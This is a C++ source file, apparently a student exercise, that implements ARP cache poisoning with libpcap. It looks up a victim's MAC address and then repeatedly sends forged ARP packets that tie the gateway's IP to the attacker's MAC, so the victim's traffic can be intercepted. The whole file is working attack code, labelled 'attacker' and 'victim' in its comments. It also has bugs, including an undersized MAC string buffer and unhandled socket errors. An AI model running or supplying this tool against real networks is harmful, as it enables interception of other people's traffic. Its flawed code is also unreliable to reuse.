#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h> 
#include <string.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <netinet/ether.h> 
#include <net/if.h> 
#include <sys/ioctl.h>
#include <string>
#include <iostream>
#include "_libnet.h"
#include <netinet/ip.h>
#include <stdint.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

char* get_mac_address();

void usage() {
	printf("syntax: arp-test <interface> <victim ip> <gateway ip>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	int cnt = 0;

	char* dev = argv[1];	//<interface>
	char* victim_ip = argv[2];	//<victim ip>
	char* gateway_ip = argv[3];	//<gateway ip>

	int res;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//	attacker's mac address
	char srcmac[100];	// src_mac
	strcpy(srcmac,get_mac_address());	// save src_mac address
	printf("attacker mac address : ");
	puts(srcmac);

	//	host mac address
	printf("host mac address : 64:79:f0:55:3b:79\n");

	//	send nomal arp request packet and save victim's mac address
	char victim_mac[100];	// victim_mac
	strcpy(victim_mac,"a4:34:d9:34:0c:ec");
	printf("victim mac address : ");
//	puts(victim_mac);

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(gateway_ip));
	packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.arp_.tip_ = htonl(Ip(victim_ip));

	const u_char* packet_data;
	char target_mac[20] = {0,};
	struct ip* iph;
	struct libnet_ethernet_hdr* mac;

  	for(int j = 0; j < 100; j++) {   
		struct pcap_pkthdr* header;
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
   
   		res = pcap_next_ex(handle,&header, &packet_data);       //if (res == 0) continue;

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
    
    	mac = (struct libnet_ethernet_hdr *)packet_data;
   		int i = 0;
   
   		char tmp[10];
   		i = 0;
      	memset(target_mac,0,20);
        while(i < 6){
     		sprintf(tmp,"%02x:",mac->ether_shost[i]);
      		strcat(target_mac,tmp);
      		if((i+1) == (5)){
				sprintf(tmp,"%02x",mac->ether_shost[++i]);
				strcat(target_mac,tmp);
			}	
			i++;
		}
   
		iph = (struct ip*)(packet_data+sizeof(struct libnet_ethernet_hdr)+2);
//		printf("%s\n",inet_ntoa(iph->ip_src));
//		printf("%s\n",target_mac);
		if(strcmp(inet_ntoa(iph->ip_src),victim_ip) == 0)	break;
   	}

//	printf("ip addr -> %s\n",inet_ntoa(iph->ip_src));
//	printf("mac addr -> %s\n", target_mac);
	puts(target_mac);

	packet.eth_.dmac_ = Mac(target_mac); // victim MAC
	packet.eth_.smac_ = Mac(srcmac); // hacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);	// hacker MAC -> 
	packet.arp_.sip_ = htonl(Ip(gateway_ip));	// gateway ip -> 192.168.0.1 -> 192.168.0.255인줄 알고 계속 실패했네;;
	packet.arp_.tmac_ = Mac(target_mac);	// victim MAC -> 34:c9:3d:cd:95:65
	packet.arp_.tip_ = htonl(Ip(victim_ip));	// victim ip

	while(1){
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		usleep(500000);
		cnt++;
		printf("%d\n",cnt);
		if (cnt > 6400) break;
	}
	pcap_close(handle);
}

char* get_mac_address(){
    int socket_fd; 
    int count_if; 
    struct ifreq *t_if_req; 
    struct ifconf t_if_conf; 
    static char arr_mac_addr[17] = {0x00, }; 
    memset(&t_if_conf, 0, sizeof(t_if_conf)); 
    t_if_conf.ifc_ifcu.ifcu_req = NULL; 
    t_if_conf.ifc_len = 0; 
    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
         
    } 
    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) { 
         
    } 
    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd); 
        free(t_if_req); 
    } 
    else { 
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req; 
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd); 
            free(t_if_req); 
        } 
        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) { 
            struct ifreq *req = &t_if_req[idx]; 
            if( !strcmp(req->ifr_name, "lo") ) {
                continue; 
            } 
            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) { 
                break; 
            } 
            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]); 
            break;
        } 
    } 
    close(socket_fd); 
    free(t_if_req);

    return arr_mac_addr;
}